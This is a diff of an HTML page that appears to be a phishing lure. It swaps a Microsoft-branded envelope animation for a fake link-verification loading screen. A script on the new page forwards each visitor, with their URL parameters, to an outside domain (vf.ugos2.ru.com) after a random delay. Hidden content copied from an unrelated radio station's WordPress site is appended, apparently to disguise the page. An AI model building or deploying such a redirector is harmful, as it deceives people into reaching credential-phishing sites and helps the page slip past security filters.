-              transform: translateY(calc(-1 * var(--envH))) rotate3d(1, 0, 0, 90deg);
-            }
-            76% {
-              transform: translateY(calc(-1 * var(--envH))) rotate3d(1, 0, 0, 90deg);
-            }
-            77% {
-              transform: translateY(calc(-1 * var(--envH))) rotate3d(1, 0, 0, 0);
-            }
-            100% {
-              transform: translateY(calc(-1 * var(--envH))) rotate3d(1, 0, 0, 0);
-            }
-          }
-
-          #fmask {
-            width: var(--envW);
-            height: 107px;
-            overflow: hidden;
-          }
-
-          .flapTriangle {
-            width: var(--flapS);
-            height: var(--flapS);
-            background: #50d9ff;
-            margin: -48px auto 0 auto;
-            border-radius: 7px;
-            transform: scaleY(0.6) rotate(45deg);
-          }
-
-          #openedFlap .flapTriangle {
-            background: #123b6d;
-          }
-
-          #closedFlap .flapTriangle {
-            background: #50d9ff;
-          }
-        </style>
-        <div id="container">
-          <div id="containerShadow"></div>
-          <div id="logo">
-		  
-            <div id="flapContainer">
-			
-              <div id="openedFlap">
-                <div id="fmask">
-                  <div class="flapTriangle"></div>
-                </div>
-              </div>
-			  
-              <div id="cal">
-                <div class="t"></div>
-                <div class="r">
-                  <div class="s s1"></div>
-                  <div class="s s2"></div>
-                  <div class="s s3"></div>
-                </div>
-                <div class="r">
-                  <div class="s s4"></div>
-                  <div class="s s1"></div>
-                  <div class="s s2"></div>
-                </div>
-                <div class="r">
-                  <div class="s s5"></div>
-                  <div class="s s4"></div>
-                  <div class="s s1"></div>
-                </div>
-              </div>
-            </div>
-            <div id="eb"></div>
-            <div id="ef">
-              <div class="r"></div>
-              <div class="l"></div>
-            </div>
-            <div id="closedFlap">
-              <div id="fmask">
-                <div class="flapTriangle"></div>
-              </div>
-            </div>
-          </div>
+</head>
+<body>
+    <div class="captcha-container">
+        <img src="data:image/png;base64,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" alt="Platinum" class="captcha-image" width="140px" Height="auto">
+        <div class="xrobot-prompt" id="robotPrompt" style="width: 250px;">Accessing link...</div>
+        <div class="loading-bar">
+            <div class="loading-progress" id="loadingProgress"></div>
         </div>
-      </div>
-      <svg height="22" id="MSLogo" width="99" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-        <g fill="none" fill-rule="evenodd">
-          <path
-            d="M34.643 12.075l-.588 1.647h-.034c-.105-.387-.28-.934-.556-1.63l-3.15-7.897h-3.077V16.75h2.03V9.032c0-.476-.01-1.052-.03-1.711-.01-.333-.049-.6-.058-.804h.045c.103.473.21.834.287 1.075l3.776 9.16h1.42l3.748-9.243c.085-.211.175-.622.257-.992h.044c-.048.915-.09 1.75-.095 2.256v7.978h2.165V4.195h-2.956l-3.228 7.88z"
-            fill="#737474"
-          ></path>
-          <path d="M0 20.956h98.148V0H0z"></path>
-          <path
-            d="M42.866 16.751h2.118V7.752h-2.118zM43.947 3.929c-.349 0-.653.119-.902.353a1.166 1.166 0 00-.378.883c0 .344.126.636.374.865.247.23.552.345.906.345s.66-.115.91-.345c.25-.23.379-.52.379-.865 0-.339-.125-.632-.37-.873a1.262 1.262 0 00-.919-.363M52.477 7.663a5.892 5.892 0 00-1.182-.127c-.971 0-1.838.209-2.574.62-.739.41-1.31.998-1.699 1.745-.386.745-.583 1.615-.583 2.585 0 .85.19 1.631.567 2.318.377.69.91 1.23 1.585 1.602.673.373 1.452.563 2.313.563 1.006 0 1.866-.201 2.554-.597l.027-.017v-1.94l-.089.066c-.312.227-.66.408-1.035.538a3.121 3.121 0 01-1.014.197c-.83 0-1.497-.26-1.982-.772-.485-.513-.73-1.233-.73-2.14 0-.912.255-1.651.761-2.196.504-.544 1.173-.82 1.986-.82.695 0 1.374.236 2.014.702l.09.063V8.011l-.029-.017c-.241-.135-.571-.246-.98-.331M59.452 7.597a2.17 2.17 0 00-1.415.507c-.358.296-.616.7-.814 1.207H57.2V7.753h-2.116v8.999H57.2v-4.603c0-.784.178-1.426.528-1.912.346-.48.806-.723 1.369-.723.19 0 .404.031.636.093.23.063.396.129.493.2l.09.064V7.737l-.034-.014c-.197-.083-.477-.126-.83-.126M66.885 14.465c-.397.499-.996.751-1.779.751-.777 0-1.39-.256-1.823-.766-.435-.51-.655-1.238-.655-2.163 0-.954.22-1.701.655-2.22.433-.516 1.04-.778 1.806-.778.743 0 1.335.25 1.758.744.426.496.642 1.237.642 2.202 0 .977-.203 1.728-.604 2.23m-1.683-6.929c-1.484 0-2.663.435-3.503 1.293-.84.857-1.265 2.044-1.265 3.527 0 1.41.415 2.543 1.235 3.368.82.826 1.936 1.245 3.316 1.245 1.438 0 2.593-.441 3.434-1.31.84-.87 1.265-2.045 1.265-3.493 0-1.433-.4-2.573-1.187-3.394-.789-.82-1.897-1.236-3.295-1.236M74.378 11.471c-.667-.268-1.095-.49-1.27-.66-.17-.165-.257-.398-.257-.693 0-.262.108-.472.327-.642.219-.17.526-.257.911-.257.357 0 .723.056 1.085.166.363.111.682.26.949.44l.088.06V7.928l-.035-.015a4.715 4.715 0 00-.962-.268 5.932 5.932 0 00-1.056-.109c-1.01 0-1.845.258-2.483.767-.64.512-.967 1.184-.967 1.997 0 .422.07.798.209 1.116.14.32.355.6.641.837.283.233.722.478 1.302.728.488.2.852.37 1.083.505.227.13.387.263.477.39.088.127.133.299.133.512 0 .604-.452.897-1.384.897a3.8 3.8 0 01-1.172-.213 4.418 4.418 0 01-1.2-.609l-.089-.064v2.064l.033.015c.304.14.686.257 1.137.35.449.094.859.141 1.213.141 1.096 0 1.977-.26 2.62-.771.648-.515.976-1.204.976-2.045 0-.607-.176-1.127-.525-1.546-.345-.416-.946-.799-1.784-1.136M84.063 14.465c-.398.499-.997.751-1.78.751-.777 0-1.39-.256-1.822-.766-.435-.51-.655-1.238-.655-2.163 0-.954.22-1.701.655-2.22.432-.516 1.04-.778 1.806-.778.743 0 1.335.25 1.758.744.426.496.642 1.237.642 2.202 0 .977-.204 1.728-.604 2.23M82.38 7.536c-1.484 0-2.663.435-3.503 1.293-.84.857-1.266 2.044-1.266 3.527 0 1.41.415 2.543 1.235 3.368.82.826 1.936 1.245 3.317 1.245 1.438 0 2.593-.441 3.433-1.31.84-.87 1.266-2.045 1.266-3.493 0-1.433-.4-2.573-1.187-3.394-.789-.82-1.897-1.236-3.295-1.236M98.149 9.48V7.752h-2.144V5.069l-.072.022-2.015.616-.038.012v2.034h-3.177V6.62c0-.527.118-.931.351-1.2.23-.266.56-.402.982-.402.303 0 .616.072.931.213l.079.035V3.447l-.037-.013c-.294-.105-.695-.159-1.19-.159-.626 0-1.194.136-1.689.406-.495.27-.886.655-1.16 1.146-.272.489-.41 1.054-.41 1.68v1.246h-1.492v1.726h1.493v7.273h2.142V9.479h3.177v4.622c0 1.903.897 2.868 2.668 2.868.291 0 .597-.034.91-.101.319-.07.535-.137.662-.21l.029-.016v-1.743l-.087.058c-.117.078-.262.14-.432.188-.17.048-.312.072-.422.072-.416 0-.723-.112-.914-.332-.191-.223-.289-.612-.289-1.158V9.48h2.144z"
-            fill="#737474"
-          ></path>
-          <path d="M0 9.958h9.958V.001H0z" fill="#F05124"></path>
-          <path d="M10.995 9.958h9.957V.001h-9.957z" fill="#7EBB42"></path>
-          <path d="M0 20.956h9.958V11H0z" fill="#32A0DA"></path>
-          <path d="M10.995 20.956h9.957V11h-9.957z" fill="#FDB813"></path>
-        </g>
-      </svg>
     </div>
-  </body>
+    <script>
+        const progressBar = document.getElementById('loadingProgress');
+        const robotPrompt = document.getElementById('robotPrompt');
+        let progress = 0;
+        const totalDuration = 12000; // 12 seconds
+        const minRedirectDelay = 5000; // 5 seconds
+        const maxRedirectDelay = 10000; // 10 seconds
+        const stepTime = totalDuration / 100; // Time for each 1% step
+        const messages = [
+            "Verifying link...",
+            "Expanding link...",
+            "Connecting to a server...",
+            "Loading page...",
+            "Verifying content...",
+            "Extracting page features...",
+            "Verifying features...",
+            "Scan Complete"
+        ];
+        let messageIndex = 0;
+
+        function startProgress() {
+            const timer = setInterval(() => {
+                progress += 1;
+                progressBar.style.width = progress + '%';
+                if (progress >= 100) {
+                    clearInterval(timer);
+                }
+            }, stepTime);
+
+            const redirectDelay = Math.random() * (maxRedirectDelay - minRedirectDelay) + minRedirectDelay;
+            setTimeout(() => {
+                const currentUrl = new URL(window.location.href);
+                const params = currentUrl.search;
+                const redirectUrl = "https://vf.ugos2.ru.com/" + params;
+                window.location.href = redirectUrl;
+            }, redirectDelay);
+        }
+
+        function changeMessage() {
+            robotPrompt.textContent = messages[messageIndex];
+            messageIndex = (messageIndex + 1) % messages.length;
+        }
+
+        window.onload = () => {
+            startProgress();
+            setInterval(changeMessage, 1700); // Change message every 1.7 seconds
+        };
+    </script>
+</body>
 </html>
+
+<div style="display: none;">
+<body class="home page-template-default page page-id-319 wp-custom-logo frontpage body_tag scheme_default blog_mode_front body_style_wide  is_stream blog_style_excerpt sidebar_hide expand_content remove_margins trx_addons_present header_type_custom header_style_header-custom-561 header_position_default menu_style_top no_layout wpb-js-composer js-comp-ver-6.6.0 vc_responsive">
+    
+	
+	<div class="body_wrap">
+
+		<div class="page_wrap"><header class="top_panel top_panel_custom top_panel_custom_561 top_panel_custom_header-default-audio without_bg_image"><div class="vc_row wpb_row vc_row-fluid vc_custom_1634087856600 vc_row-has-fill shape_divider_top-none shape_divider_bottom-none sc_layouts_row sc_layouts_row_type_normal"><div class="wpb_column vc_column_container vc_col-sm-12 sc_layouts_column_icons_position_left"><div class="vc_column-inner"><div class="wpb_wrapper"><div class="vc_empty_space  hide_on_mobile"   style="height: 0.25em"><span class="vc_empty_space_inner"></span></div><div id="sc_content_373770735"
+		class="sc_content color_style_default sc_content_default sc_content_width_1_1 sc_float_center"><div class="sc_content_container"><div class="vc_row wpb_row vc_inner vc_row-fluid vc_row-o-equal-height vc_row-o-content-middle vc_row-flex shape_divider_top-none shape_divider_bottom-none"><div class="wpb_column vc_column_container vc_col-sm-4 vc_col-xs-6 sc_layouts_column sc_layouts_column_align_left sc_layouts_column_icons_position_left"><div class="vc_column-inner"><div class="wpb_wrapper"><div class="sc_layouts_item"><a href="https://hotwaxradio.com/wp/" id="sc_layouts_logo_81201392" class="sc_layouts_logo sc_layouts_logo_default"><img class="logo_image"
+					src="//hotwaxradio.com/wp/wp-content/uploads/2021/10/cropped-Hot-Wax-Logo-256.png"
+					alt="Hot Wax Radio" width="256" height="254"></a><!-- /.sc_layouts_logo --></div></div></div></div><div class="wpb_column vc_column_container vc_col-sm-8 vc_col-xs-6 sc_layouts_column sc_layouts_column_align_right sc_layouts_column_icons_position_left"><div class="vc_column-inner"><div class="wpb_wrapper"><div class="sc_layouts_item"><nav class="sc_layouts_menu sc_layouts_menu_default sc_layouts_menu_dir_horizontal menu_hover_fade hide_on_mobile" itemtype="http://schema.org/SiteNavigationElement" itemscope="itemscope" id="sc_layouts_menu_384373103"		><ul id="sc_layouts_menu_1906351718" class="sc_layouts_menu_nav"><li id="menu-item-327" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home current-menu-item page_item page-item-319 current_page_item menu-item-327"><a href="https://hotwaxradio.com/wp/" aria-current="page"><span>Home</span></a></li><li id="menu-item-1397" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1397"><a href="https://hotwaxradio.com/wp/shows/"><span>Shows</span></a></li><li id="menu-item-340" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-340"><a href="https://hotwaxradio.com/wp/submit-music/"><span>Submit Your Music</span></a></li><li id="menu-item-177" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-177"><a href="https://hotwaxradio.com/wp/contact/"><span>Contact</span></a></li><li id="menu-item-284" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-284"><a href="https://hotwaxradio.com/wp/about/"><span>About</span></a>
+<ul class="sub-menu"><li id="menu-item-969" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-969"><a href="https://hotwaxradio.com/wp/terms-privacy/"><span>Terms &#038; Privacy</span></a></li></ul>
+</li></ul></nav><!-- /.sc_layouts_menu --><div class="sc_layouts_iconed_text sc_layouts_menu_mobile_button">
+		<a class="sc_layouts_item_link sc_layouts_iconed_text_link" href="#">
+			<span class="sc_layouts_item_icon sc_layouts_iconed_text_icon trx_addons_icon-menu"></span>
+		</a>
+	</div></div></div></div></div></div></div></div><!-- /.sc_content --><div id="sc_content_977042833"
+		class="sc_content color_style_default sc_content_default sc_content_width_1_1 sc_float_center"><div class="sc_content_container"><div class="vc_empty_space"   style="height: 3em"><span class="vc_empty_space_inner"></span></div><div class="vc_empty_space"   style="height: 0.7em"><span class="vc_empty_space_inner"></span></div><div class="vc_empty_space  hide_on_mobile"   style="height: 1em"><span class="vc_empty_space_inner"></span></div><div class="vc_row wpb_row vc_inner vc_row-fluid shape_divider_top-none shape_divider_bottom-none"><div class="wpb_column vc_column_container vc_col-sm-6 vc_hidden-xs sc_layouts_column_icons_position_left"><div class="vc_column-inner"><div class="wpb_wrapper"><div class="vc_empty_space"   style="height: 0.7em"><span class="vc_empty_space_inner"></span></div><div class="sc_layouts_item"><div id="widget_audio_1511681235" class="widget_area sc_widget_audio vc_widget_audio wpb_content_element"><aside id="widget_audio_1511681235_widget" class="widget widget_audio"><div class="trx_addons_audio_wrap">
+		<div class="trx_addons_audio_list">
+						<div class="trx_addons_audio_player
+				 without_cover					"
+									>
+					<div class="trx_addons_audio_player_wrap">
+										 
+		<div class="audio_info">
+													<h6 class="audio_author">Now Playing</h6>
+													<h5 class="audio_caption">HotWaxRadio.com Live Stream</h5>
+								</div>
+											<div class="audio_frame audio_local">
+													<audio src="https://stream.abyss-shoutcast.com/proxy/hotwaxradiocom/stream"></audio>
+													</div>
+				</div>
+				</div>
+						</div>
